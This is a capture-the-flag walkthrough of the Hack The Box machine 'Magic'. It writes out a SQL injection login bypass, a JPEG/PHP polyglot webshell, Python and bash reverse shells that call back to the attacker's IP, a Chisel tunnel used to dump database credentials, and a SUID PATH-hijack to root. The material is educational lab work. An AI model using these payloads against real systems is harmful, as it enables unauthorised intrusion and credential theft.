# HTB: Magic

**Target IP:** 10.129.49.121
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/magic]
└─# rustscan -a 10.129.49.121
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

Open 10.129.49.121:22
Open 10.129.49.121:80
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 03:19 +0000
Initiating Ping Scan at 03:19
Scanning 10.129.49.121 [4 ports]
Completed Ping Scan at 03:19, 0.30s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 03:19
Discovered open port 22/tcp on 10.129.49.121
Discovered open port 80/tcp on 10.129.49.121
Completed SYN Stealth Scan at 03:19, 0.30s elapsed (2 total ports)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 2.73 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/magic]
└─# nmap -sCV -T4 -p22,80 10.129.49.121 -oA nmap/nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 03:20 +0000
Nmap scan report for 10.129.49.121
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: **SSH (OpenSSH 7.6p1)** and **HTTP (Apache 2.4.29)**.

---

## 2. Web Enumeration

### 2.1 Directory Brute-Force (ffuf)

First pass without a size filter was noisy — the wordlist's own comment lines were reflected as false 200s from the target:

```
┌──(root㉿kali)-[/home/kali/magic]
└─# ffuf -u http://10.129.49.121/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php -mc 200

       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://10.129.49.121/FUZZ
 :: Extensions       : .php
 :: Matcher          : Response status: 200
________________________________________________

# Priority-ordered case-insensitive list, where entries were found [Status: 200, Size: 4048, ...]
.....
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Re-ran filtering out the noise size (`-fs 4052`):

```
┌──(root㉿kali)-[/home/kali/magic]
└─# ffuf -u http://10.129.49.121/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php -mc 200 -fs 4052

       v2.1.0-dev
________________________________________________
 :: Filter           : Response size: 4052
________________________________________________

.....
login.php               [Status: 200, Size: 4221, Words: 1179, Lines: 118, Duration: 292ms]
.....
index.php               [Status: 200, Size: 4051, Words: 491, Lines: 60, Duration: 4812ms]
```

Found **`login.php`** — a login portal.

---

## 3. Initial Foothold — SQLi Auth Bypass → Malicious Image Upload → LFI-less RCE

### 3.1 SQL Injection Login Bypass

Default credentials on `login.php` failed. Attempted classic SQL injection auth bypass. Due to a broken spacebar on the local terminal, the payload was typed out separately and pasted in:

```
' OR 1=1-- -
```

This bypassed authentication and logged in successfully.

### 3.2 Malicious File Upload (Image Polyglot)

The app had an image upload feature. Crafted a polyglot file — valid JPEG magic bytes followed by a PHP payload — to slip past extension/content-type checks:

```bash
printf '\xFF\xD8\xFF\xE0<?php echo "It is working!"; system($_REQUEST["cmd"]); ?>' > shell.php.jpg
```

Upload succeeded.

### 3.3 Locating the Uploaded Shell (feroxbuster)

Ran a recursive content discovery scan to find the upload directory and confirm the shell landed somewhere web-accessible:

```
┌──(root㉿kali)-[/home/kali/magic]
└─# feroxbuster -u http://10.129.49.121/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.49.121/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 🔎  Extract Links         │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter
301      GET        9l       28w      315c http://10.129.49.121/images => http://10.129.49.121/images/
200      GET        2l       51w     1851c http://10.129.49.121/assets/js/browser.min.js
200      GET       16l       41w      280c http://10.129.49.121/assets/css/noscript.css
200      GET      209l      457w    32922c http://10.129.49.121/images/fulls/1.jpg
200      GET      192l     1093w    88071c http://10.129.49.121/images/fulls/5.jpeg
200      GET        2l     1276w    88145c http://10.129.49.121/assets/js/jquery.min.js
200      GET      490l     2867w   223637c http://10.129.49.121/images/uploads/logo.png
200      GET     3315l     6597w   390337c http://10.129.49.121/images/fulls/6.jpg
200      GET      390l      896w     8862c http://10.129.49.121/assets/js/main.js
200      GET        2l       87w     2439c http://10.129.49.121/assets/js/breakpoints.min.js
200      GET      118l      277w     4221c http://10.129.49.121/login.php
200      GET        2l      119w    12085c http://10.129.49.121/assets/js/jquery.poptrox.min.js
200      GET      587l     1232w    12433c http://10.129.49.121/assets/js/util.js
301      GET        9l       28w      315c http://10.129.49.121/assets => http://10.129.49.121/assets/
200      GET      835l     1757w    16922c http://10.129.49.121/assets/css/main.css
200      GET      151l      677w    68311c http://10.129.49.121/images/uploads/magic-hat_23-2147512156.jpg
200      GET       88l      506w    34251c http://10.129.49.121/images/fulls/2.jpg
200      GET      255l     1421w   121103c http://10.129.49.121/images/uploads/magic-wand.jpg
200      GET      274l     1555w  1460797c http://10.129.49.121/images/fulls/3.jpg
200      GET     3380l    16502w  5289209c http://10.129.49.121/images/uploads/7.jpg
200      GET      235l     1791w   361568c http://10.129.49.121/images/uploads/trx.jpg
301      GET        9l       28w      323c http://10.129.49.121/images/uploads => http://10.129.49.121/images/uploads/
```

Confirmed uploads land in **`/images/uploads/`**.

### 3.4 Confirming Code Execution

```
┌──(root㉿kali)-[/home/kali/magic]
└─# curl 'http://10.129.49.121/images/uploads/shell.php.jpg?cmd=whoami'
    It is working!www-data
```

PHP executed despite the `.jpg` double-extension — arbitrary command execution confirmed as **www-data**.

### 3.5 Reverse Shell

Triggered a Python one-liner reverse shell through the `cmd` parameter:

```
http://10.129.49.121/images/uploads/shell.php.jpg?cmd=export RHOST="10.10.15.146";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Shell caught as **www-data**.

---

## 4. Lateral Movement — DB Creds → Chisel Tunnel → MySQL Loot → su theseus

### 4.1 Discovering DB Credentials

```
www-data@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

Found DB credentials: **`theseus` / `iamkingtheseus`**.

### 4.2 No Local MySQL Client Available

```
www-data@ubuntu:/var/www/Magic$ mysql -u theseus -p -D Magic

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.
```

No client on-box, and MySQL is presumably bound to localhost only. Pivoted using **Chisel** to tunnel the remote MySQL port back to Kali.

### 4.3 Chisel Reverse Tunnel

On the target (www-data shell):
```
www-data@ubuntu:/tmp$ file chisel
chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
www-data@ubuntu:/tmp$ chmod +x chisel
www-data@ubuntu:/tmp$ ./chisel client 10.10.15.146:8000 R:3306:127.0.0.1:3306
2026/07/29 21:47:48 client: Connecting to ws://10.10.15.146:8000
2026/07/29 21:47:50 client: Connected (Latency 294.089576ms)
```

On Kali (listener):
```
┌──(root㉿kali)-[/home/kali/magic]
└─# chisel server -p 8000 --reverse
2026/07/30 04:46:25 server: Reverse tunnelling enabled
2026/07/30 04:46:25 server: Fingerprint vBDD1J09AEQv6sfSZ6iqTPZBcCfttMzm6Kg5ov3XA8E=
2026/07/30 04:46:25 server: Listening on http://0.0.0.0:8000
2026/07/30 04:47:44 server: session#1: Client version (1.9.1) differs from server version (1.11.7-0kali1)
2026/07/30 04:47:44 server: session#1: tun: proxy#R:3306=>3306: Listening
```

Target's local `127.0.0.1:3306` (MySQL) is now reachable from Kali at `127.0.0.1:3306` through the tunnel.

### 4.4 Dumping the `login` Table

```
┌──(root㉿kali)-[/home/kali/magic]
└─# mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
2 rows in set (0.294 sec)

MySQL [(none)]> use Magic
Database changed
MySQL [Magic]> show tables;
+-----------------+
| Tables_in_Magic |
+-----------------+
| login           |
+-----------------+
1 row in set (0.300 sec)

MySQL [Magic]> select * from login;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
1 row in set (0.294 sec)
```

Recovered credential: **`admin` / `Th3s3usW4sK1ng`** (this turned out to be the OS password for user `theseus`, not just the web login).

### 4.5 Attempted SSH — Failed (Key-Only Auth)

```
┌──(root㉿kali)-[/home/kali/magic]
└─# ssh theseus@10.129.49.121
theseus@10.129.49.121: Permission denied (publickey).
```

SSH only accepts key-based auth for this account — password login is disabled remotely.

### 4.6 Local Privilege Switch (`su`) from the Webshell

```
www-data@ubuntu:/tmp$ su theseus
Password: 
theseus@ubuntu:/tmp$ cd /home/theseus
```

Using the recovered password locally via `su` succeeded, landing a shell as **theseus**.

---

## 5. user.txt

```
theseus@ubuntu:~$ cat user.txt | wc
      1       1      33
```

**User flag obtained.**

---

## 6. Privilege Escalation — SUID Binary Abuse (`sysinfo` PATH Hijack)

### 6.1 SUID Enumeration

```
theseus@ubuntu:~$ find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-xr-- 1 root dip 382696 Feb 11  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
.....
<snip — long list of standard distro/snap-core SUID binaries: chfn, chsh, gpasswd, sudo,
pkexec, su, mount, umount, ping, dbus-daemon-launch-helper, ssh-keysign, polkit-agent-helper-1,
dmcrypt-get-device, Xorg.wrap, snap-confine — repeated across /snap/core*/, /snap/core18/*,
/snap/core20/*, none of which were abnormal or useful for this box>
.....
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
```

Out of the entire list, **`/bin/sysinfo`** stood out — a non-standard SUID binary, owned by `root:users` and not part of any stock distro package.

### 6.2 Analyzing `sysinfo`

```
theseus@ubuntu:~$ strings /bin/sysinfo
```

Revealed it shells out to several system utilities **without absolute paths**, e.g.:

```
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
```

Since `free` is invoked by bare name and the binary runs SUID root, this is a classic **PATH hijacking** vulnerability.

### 6.3 PATH Hijack Exploitation

```
theseus@ubuntu:/tmp$ echo '#!/bin/bash' > /tmp/free
theseus@ubuntu:/tmp$ echo '/bin/bash -p' >> /tmp/free
theseus@ubuntu:/tmp$ chmod +x /tmp/free
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
theseus@ubuntu:/tmp$ /bin/sysinfo
.....
address sizes   : 43 bits physical, 48 bits virtual
power management:

====================MEM Usage=====================
root@ubuntu:/tmp#
```

`sysinfo` reached the `free -h` step, resolved `free` from the hijacked `/tmp` (now first in `$PATH`), and executed the malicious script — spawning `/bin/bash -p` as **root**.

### 6.4 Reverse Shell as Root (for a stable session)

The interactive shell wasn't printing output cleanly, so a reverse shell was fired to get a clean root session:

```
root@ubuntu:/# sh -i >& /dev/tcp/10.10.15.146/5555 0>&1
```

```
┌──(root㉿kali)-[/home/kali/magic]
└─# nc -lvnp 5555   
listening on [any] 5555 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.49.121] 57736
# whoami
root
# pwd
/
# cd root
# cat root.txt | wc
      1       1      33
```

**Root obtained.** `root.txt` confirmed present in `/root`.

---

## 7. Summary / Attack Chain

1. **Recon**: RustScan/Nmap → only SSH (22) and HTTP (80) open.
2. **Web enum**: ffuf → `login.php` discovered.
3. **Auth bypass**: SQL injection (`' OR 1=1-- -`) bypassed login.
4. **File upload RCE**: Uploaded a JPEG/PHP polyglot (`shell.php.jpg`) via the app's image upload feature; feroxbuster located it under `/images/uploads/`; the `.php.jpg` extension was still executed as PHP by Apache → RCE as **www-data**.
5. **Credential discovery**: Found DB credentials (`theseus:iamkingtheseus`) in `db.php5` on disk.
6. **Pivoting for DB access**: No local `mysql` client → tunneled the target's local-only MySQL (3306) back to Kali using **Chisel** reverse tunnel.
7. **Credential reuse**: Dumped the `login` table from the `Magic` database → recovered `admin:Th3s3usW4sK1ng`, which doubled as the **theseus** OS account password (`su theseus` from the webshell, since SSH was key-only).
8. **User flag**: Retrieved from `theseus`'s home directory.
9. **PrivEsc**: SUID enumeration revealed a non-standard binary `/bin/sysinfo` calling `free` (among other tools) without an absolute path → classic **PATH hijack**: planted a malicious `free` script in `/tmp`, prepended `/tmp` to `$PATH`, ran `sysinfo` → root shell → `root.txt`.

### Key Vulnerabilities Chained
- SQL injection authentication bypass on `login.php`
- Unrestricted/insufficiently validated file upload allowing a PHP/image polyglot to be executed as a script
- Sensitive credentials hardcoded in a web-accessible-adjacent config file (`db.php5`)
- Local service (MySQL) reachable only via tunneling due to missing client tooling — bypassed using Chisel
- Password reuse between the web application's DB and a real OS user account
- Custom SUID binary (`sysinfo`) insecurely calling system utilities without absolute paths → PATH hijacking to root
